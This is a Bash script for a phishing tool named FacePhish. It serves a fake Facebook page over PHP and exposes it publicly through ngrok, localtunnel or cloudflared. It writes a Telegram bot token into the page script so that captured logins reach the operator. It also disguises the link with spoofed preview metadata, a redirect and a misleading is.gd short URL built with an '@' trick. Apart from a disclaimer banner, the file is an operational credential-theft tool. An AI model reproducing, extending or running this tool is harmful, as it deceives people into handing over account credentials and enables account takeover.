#!/bin/bash
#
# FacePhish: Open Source
# License: General Public License
# System: GNU/linux
# Date: 09-11-2022
#
# YouTube: https://youtube.com/channel/UCfMjNcFvJae_9g7wQI2W7EA
# Facebook: https://www.facebook.com/whitehacks00
# TikTok: https://tiktok.com/@whitehacks00
# Telegram: https://t.me/whitehacks00
# GitHub: https://github.com/Darkmux
#
# This tool was created in honor of @thelinuxchoice.
#
# ==============================================
#                   Variables
# ==============================================
operatingSystem=$(uname -o)
deviceArchitecture=$(uname -m)
showPath=$(pwd)
webSite="website"
subDomain="facebook"
port="8080"
file="index.html"
showDate=$(date)
# ==============================================
#                  Light colors
# ==============================================
black="\e[1;30m"
blue="\e[1;34m"
green="\e[1;32m"
cyan="\e[1;36m"
red="\e[1;31m"
purple="\e[1;35m"
yellow="\e[1;33m"
white="\e[1;37m"
# ==============================================
#                  Dark colors
# ==============================================
blackDark="\e[0;30m"
blueDark="\e[0;34m"
greenDark="\e[0;32m"
cyanDark="\e[0;36m"
redDark="\e[0;31m"
purpleDark="\e[0;35m"
yellowDark="\e[0;33m"
whiteDark="\e[0;37m"
# ==============================================
#               Background colors
# ==============================================
blackBack=$(setterm -background black)
blueBack=$(setterm -background blue)
greenBack=$(setterm -background green)
cyanBack=$(setterm -background cyan)
redBack=$(setterm -background red)
yellowBack=$(setterm -background yellow)
whiteBack=$(setterm -background white)
# ==============================================
#             Checking dependencies
# ==============================================
function dependencies() {
    git=$(command -v git)
    curl=$(command -v curl)
    wget=$(command -v wget)
    ssh=$(command -v ssh)
    nodejs=$(command -v node)
    npm=$(command -v npm)
    php=$(command -v php)
    ngrok=$(command -v ngrok)
    lt=$(command -v lt)
    cloudflared=$(command -v cloudflared)

    if [[ "${git}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}git${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${curl}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}curl${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${wget}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}wget${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${ssh}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}ssh${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${nodejs}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}node${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${npm}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}npm${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${php}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}php${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${ngrok}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}ngrok${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${lt}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}lt${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
        exit
    fi
    if [[ "${cloudflared}" == "" ]]; then
        echo -e ${red}"[${yellow}!${red}] ${black}𝙋𝙇𝙀𝘼𝙎𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 ${red}(${yellow}cloudflared${red}) ${black}𝘼𝙉𝘿 𝙍𝙐𝙉 𝙏𝙃𝙀 𝙎𝘾𝙍𝙄𝙋𝙏"${white}
    fi
}
# ==============================================
#                 Telegram BOT
# ==============================================
function telegram() {
    if [[ ! -f ".tme" ]]; then
        banner
        echo -e ""
        echo -e -n "${blue}${whiteBack}[➤] 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝙏𝙊𝙆𝙀𝙉 𝘽𝙊𝙏 ${blackBack}➤➤➤ "${white}
        read -r botoken
        sleep 0.5
        echo -e -n "${blue}${whiteBack}[➤] 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙏𝙄𝘿 ${blackBack}➤➤➤ "${white}
        read -r chatid
        sleep 0.5
        echo -e "${botoken}" >> .tme
        echo -e "${chatid}" >> .tme

        getbotoken=$(head -n 1 .tme)
        getchatid=$(tail -n 1 .tme)

        sed -i "s/TOSUS/${getbotoken}/g" ${webSite}/script.js
        sed -i "s/CHGLO/${getchatid}/g" ${webSite}/script.js
    fi
}
# ==============================================
#                Banner FacePhish
# ==============================================
function banner() {
    sleep 0.5
    clear
    cat facephish.txt
    echo -e ""
    echo -e "     ${blueBack}${white} ::   𝙏𝙃𝙀 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝙄𝙎 𝙉𝙊𝙏 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙄𝘽𝙇𝙀   :: "${blackBack}
    echo -e "     ${blueBack}${white} :: 𝙁𝙊𝙍 𝘼𝙉𝙔 𝘿𝘼𝙈𝘼𝙂𝙀𝙎 𝘾𝘼𝙐𝙎𝙀𝘿 𝘽𝙔 𝙁𝘼𝘾𝙀𝙋𝙃𝙄𝙎𝙃. :: "${blackBack}
    echo -e ""
    echo -e "        ${whiteBack}${blue}    © 𝙒𝙃𝙄𝙏𝙀 𝙃𝘼𝘾𝙆𝙎 :: @𝙬𝙝𝙞𝙩𝙚𝙝𝙖𝙘𝙠𝙨𝟬𝟬    "${blackBack}
    echo -e ""
    echo -e "          ${blueBack}${white} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙏𝙊𝙊𝙇 𝘾𝙊𝘿𝙀𝘿 𝘽𝙔: @𝘿𝘼𝙍𝙆𝙈𝙐𝙓 "${blackBack}
    echo -e ""
    echo -e "                 ${whiteBack}${blue}  :: 𝙁𝘼𝘾𝙀𝙋𝙃𝙄𝙎𝙃 ::  ${blackBack}"
}
# ==============================================
#             Invalid Option Message
# ==============================================
function invalid() {
    echo -e ""
    echo -e ${red}"[${yellow}!${red}] ${black}𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙊𝙋𝙏𝙄𝙊𝙉"${white}
    sleep 0.5
}
function notFound() {
    echo -e ""
    echo -e ${red}"[${yellow}!${red}] ${black}𝙄𝙈𝘼𝙂𝙀 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"${white}
    sleep 0.5
}
# ==============================================
#              Checking Processes
# ==============================================
function processes() {
    phpCheck=$(ps aux | grep -o "php" | head -n1)
    ngrokCheck=$(ps aux | grep -o "ngrok" | head -n1)
    ltCheck=$(ps aux | grep -o "lt" | head -n1)
    cloudCheck=$(ps aux | grep -o "cloudflared" | head -n1)

    if [[ ${phpCheck} == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
    if [[ ${ngrokCheck} == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi
    if [[ ${ltCheck} == *'lt'* ]]; then
        pkill -f -2 lt > /dev/null 2>&1
        killall -2 lt > /dev/null 2>&1
    fi
    if [[ ${cloudCheck} == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
}
# ==============================================
#                Defining Servers
# ==============================================
function localhost() {
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙋𝙃𝙋 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    php -S localhost:${port} -t ${webSite} > /dev/null 2>&1 &
    sleep 2
    echo -e "${blueBack}${white}𝘾𝙐𝙎𝙏𝙊𝙈𝙄𝙕𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙐𝙍𝙇...${blackBack}"${white}
    echo -e ""
    sleep 2
    echo -e "${blueBack}${white}𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙇𝙄𝙉𝙆...${blackBack}"${white}
    echo -e ""
    sleep 2
    link="http://localhost:${port}"
}
function ngrokserv() {
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙋𝙃𝙋 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    php -S localhost:${port} -t ${webSite} > /dev/null 2>&1 &
    ngrok http ${port} > /dev/null 2>&1 &
    sleep 5
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙉𝙂𝙍𝙊𝙆 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝘾𝙐𝙎𝙏𝙊𝙈𝙄𝙕𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙐𝙍𝙇...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙇𝙄𝙉𝙆...${blackBack}"${white}
    echo -e ""
    sleep 7
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.sa.ngrok.io")
    if [[ "${link}" == "" ]]; then
        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
    fi
}
function localtunnel() {
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙋𝙃𝙋 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    php -S localhost:${port} -t ${webSite} > /dev/null 2>&1 &
    sleep 2
    lt --port ${port} --subdomain ${subDomain} > link.txt &
    sleep 5
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙇𝙊𝘾𝘼𝙇𝙏𝙐𝙉𝙉𝙀𝙇 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝘾𝙐𝙎𝙏𝙊𝙈𝙄𝙕𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙐𝙍𝙇...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙇𝙄𝙉𝙆...${blackBack}"${white}
    echo -e ""
    sleep 7
    link=$(grep -i "is:" link.txt | cut -d " " -f4)
    rm link.txt
}
function cloud() {
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝙋𝙃𝙋 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    php -S localhost:${port} -t ${webSite} > /dev/null 2>&1 &
    sleep 2
    cloudflared --url localhost:${port} --logfile cloud.log > /dev/null 2>&1 &
    sleep 5
    echo -e "${blueBack}${white}𝙎𝙏𝘼𝙍𝙏𝙄𝙉𝙂 𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀𝘿 𝙎𝙀𝙍𝙑𝙀𝙍...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝘾𝙐𝙎𝙏𝙊𝙈𝙄𝙕𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙐𝙍𝙇...${blackBack}"${white}
    echo -e ""
    sleep 7
    echo -e "${blueBack}${white}𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙄𝙉𝙂 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂 𝙇𝙄𝙉𝙆...${blackBack}"${white}
    echo -e ""
    sleep 7
    link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" "cloud.log")
    rm cloud.log
}
function githubpages() {
    link="http://localhost:${port}"

    if [ "${operatingSystem}" == "Android" ]; then
        deploy="/storage/emulated/0"
    else
        deploy=$(pwd)
    fi

    if [ -d ${deploy}/GitHubPages ]; then
        rm -rf ${deploy}/GitHubPages
        mkdir -p ${deploy}/GitHubPages
    else
        mkdir -p ${deploy}/GitHubPages
    fi

    banner
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white} 𝘿𝙀𝙋𝙇𝙊𝙔 𝙏𝙃𝙀 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝙊𝙉 𝙂𝙄𝙏𝙃𝙐𝘽 𝙋𝘼𝙂𝙀𝙎 ${blackBack}
➤➤➤ ${whiteBack}${blue} ${deploy}/GitHubPages/${webSite} ${blackBack}"
    echo -e ""${white}
}
# ==============================================
#                 Servers Menu
# ==============================================
function servers() {
    banner
    echo -e ""
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟭] 𝙇𝙊𝘾𝘼𝙇𝙃𝙊𝙎𝙏   ${blackBack}"
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟮] 𝙉𝙂𝙍𝙊𝙆       ${blackBack}"
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟯] 𝙇𝙊𝘾𝘼𝙇𝙏𝙐𝙉𝙉𝙀𝙇 ${blackBack}"
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟰] 𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀𝘿 ${blackBack}"
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟱] 𝙂𝙄𝙏𝙃𝙐𝘽𝙋𝘼𝙂𝙀𝙎 ${blackBack}"
    echo -e ""
    echo -e ""
    echo -e -n "${blueBack}${white} [𝟬𝟬] 𝙀𝙓𝙄𝙏 ${blackBack}➤➤➤ "${white}
    read -r server

    if [[ "${server}" == "0" || "${server}" == "00" ]]; then
        exit
    elif [[ "${server}" == "1" || "${server}" == "01" ]]; then
        starting="localhost"
    elif [[ "${server}" == "2" || "${server}" == "02" ]]; then
        starting="ngrokserv"
    elif [[ "${server}" == "3" || "${server}" == "03" ]]; then
        starting="localtunnel"
    elif [[ "${server}" == "4" || "${server}" == "04" ]]; then
        starting="cloud"
    elif [[ "${server}" == "5" || "${server}" == "05" ]]; then
        starting="githubpages"
    else
        invalid
        servers
    fi
}
# ==============================================
#              Printing Mapped Data
# ==============================================
function customize() {
    banner
    echo -e ""
    echo -e ""
    echo -e "${whiteBack}${blue} [𝟬𝟭] 𝙋𝙄𝘾𝙏𝙐𝙍𝙀     ${blackBack} ➤➤➤ ${blueBack}${white} ${picture} ${blackBack}"
    echo -e "${whiteBack}${blue} [𝟬𝟮] 𝙏𝙄𝙏𝙇𝙀       ${blackBack} ➤➤➤ ${blueBack}${white} ${title} ${blackBack}"
    echo -e "${whiteBack}${blue} [𝟬𝟯] 𝘿𝙀𝙎𝘾𝙍𝙄𝙋𝙏𝙄𝙊𝙉 ${blackBack} ➤➤➤ ${blueBack}${white} ${description} ${blackBack}"
    echo -e "${whiteBack}${blue} [𝟬𝟰] 𝘿𝙊𝙈𝘼𝙄𝙉      ${blackBack} ➤➤➤ ${blueBack}${white} ${domain} ${blackBack}"
    echo -e "${whiteBack}${blue} [𝟬𝟱] 𝙍𝙀𝘿𝙄𝙍𝙀𝘾𝙏    ${blackBack} ➤➤➤ ${blueBack}${white} ${redirect} ${blackBack}"
    echo -e "${whiteBack}${blue} [𝟬𝟲] 𝙒𝙊𝙍𝘿𝙎       ${blackBack} ➤➤➤ ${blueBack}${white} ${url} ${blackBack}"
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white} [𝟬𝟬] 𝙀𝙓𝙄𝙏 ${blackBack}"${white}
    echo -e -n "${blueBack}${white} [𝙂𝙊] 𝙎𝙏𝘼𝙍𝙏 𝙎𝙀𝙍𝙑𝙀𝙍 ${blackBack}➤➤➤ "${white}
    read -r custom
# ==============================================
#         Requesting Data From The User
# ==============================================
    if [[ "${custom}" == "0" || "${custom}" == "00" ]]; then
        exit
    elif [[ "${custom}" == "1" || "${custom}" == "01" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝙄𝙈𝘼𝙂𝙀 𝙋𝘼𝙏𝙃 ${blackBack}➤➤➤ "${white}
        read -r img
        if [ -f "${img}" ]; then
            picture=$(basename "${img}")
            customize
        else
            notFound
            customize
        fi
    elif [[ "${custom}" == "2" || "${custom}" == "02" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝘼 𝙏𝙄𝙏𝙇𝙀 ${blackBack}➤➤➤ "${white}
        read -r title
        customize
    elif [[ "${custom}" == "3" || "${custom}" == "03" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝘼 𝘿𝙀𝙎𝘾𝙍𝙄𝙋𝙏𝙄𝙊𝙉 ${blackBack}➤➤➤ "${white}
        read -r description
        customize
    elif [[ "${custom}" == "4" || "${custom}" == "04" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝘼 𝘿𝙊𝙈𝘼𝙄𝙉 ${blackBack}➤➤➤ "${white}
        read -r domain
        customize
    elif [[ "${custom}" == "5" || "${custom}" == "05" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝘼 𝙍𝙀𝘿𝙄𝙍𝙀𝘾𝙏 𝙇𝙄𝙉𝙆 ${blackBack}➤➤➤ "${white}
        read -r redirect
        customize
    elif [[ "${custom}" == "6" || "${custom}" == "06" ]]; then
        banner
        echo -e ""
        echo -e ""
        echo -e -n "${blueBack}${white} [-] 𝙀𝙉𝙏𝙀𝙍 𝙒𝙊𝙍𝘿𝙎 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙇𝙄𝙉𝙆 ${blackBack}➤➤➤ "${white}
        read -r words
        url=$(echo -e "${words}" | tr ' ' '-')
        customize
    elif [[ "${custom}" == "go" || "${custom}" == "GO" ]]; then
        sleep 0.5
    else
        invalid
        customize
    fi
}
# ==============================================
#       Deleting and Creating Image Folder
# ==============================================
function imgFolder() {
    if [ -d ${webSite}/save ]; then
        rm -rf ${webSite}/save
        mkdir -p ${webSite}/save
    else
        mkdir -p ${webSite}/save
    fi
}
# ==============================================
#       Adding Data Assigned To The Code
# ==============================================
function setPicture() {
    cp ${img} ${webSite}/save/${picture} > /dev/null 2>&1
    image="${link}/save/${picture}"
    addPicture="<meta property='og:image' content='${image}'/>"
    sed -i "/<meta property='og:image' content='.*'/d" ${webSite}/${file}
    sed -i '8i '"${addPicture}"'' ${webSite}/${file}
}
function setTitle() {
    addTitle="<meta property='og:title' content='${title}'/>"
    sed -i "/<meta property='og:title' content='.*'/d" ${webSite}/${file}
    sed -i '8i '"${addTitle}"'' ${webSite}/${file}
}
function setDescription() {
    addDescription="<meta property='og:description' content='${description}'/>"
    sed -i "/<meta property='og:description' content='.*'/d" ${webSite}/${file}
    sed -i '8i '"${addDescription}"'' ${webSite}/${file}
}
function setDomain() {
    addDomain="<meta property='og:url' content='http://${domain}' />"
    sed -i "/<meta property='og:url' content='.*'/d" ${webSite}/${file}
    sed -i '8i '"${addDomain}"'' ${webSite}/${file}
}
function setRedirect() {
    addRedirect="window.location.href = '${redirect}';"
    sed -i "/window.location.href = '.*'/d" ${webSite}/script.js
    sed -i '28i '"${addRedirect}"'' ${webSite}/script.js
}
function setUrl() {
    short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
    echo -e "${short}" >> isgd.txt
    protocol=$(tail -n1 isgd.txt | cut -d "/" -f1)
    isgdDomain=$(tail -n1 isgd.txt | cut -d "/" -f4)
    simbol="@"
    if [[ "${url}" == "" ]]; then
        simbol=""
    fi
    isgd="${protocol}//${url}${simbol}is.gd/${isgdDomain}"
    rm isgd.txt
    addWords="words='${url}'"
    sed -i "/words='.*'/d" short.sh
    sed -i '13i '"${addWords}"'' short.sh
}
function urlPhishing() {
    banner
    echo -e ""
    echo -e ""
    echo -e "${blueBack}${white} [-] 𝙇𝙄𝙉𝙆 ${blackBack}➤➤➤ ${blue}${link}"
    echo -e ""
    echo -e "${blueBack}${white} [-] 𝙎𝙃𝙊𝙍𝙏 ${blackBack}➤➤➤ ${blue}${isgd}"
    echo -e ""
    echo -e ""
    echo -e "${whiteBack}${blue} [+] 𝙒𝘼𝙄𝙏 𝙁𝙊𝙍 𝙏𝙃𝙀 𝘾𝙍𝙀𝘿𝙀𝙉𝙏𝙄𝘼𝙇𝙎 𝙄𝙉 𝙔𝙊𝙐𝙍 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘽𝙊𝙏... ${blackBack}"${white}
    echo -e ""
}
# ==============================================
#              Declaring Functions
# ==============================================
dependencies
telegram
processes
servers
customize
imgFolder
setTitle
setDescription
setDomain
setRedirect
${starting}
setPicture
setUrl

if [[ "${starting}" == "githubpages" ]]; then
    cp -r ${webSite} ${deploy}/GitHubPages
else
    urlPhishing
fi

# ==============================================
#    Created by: @Darkmux - WHITE HACKS ©2023
# ==============================================
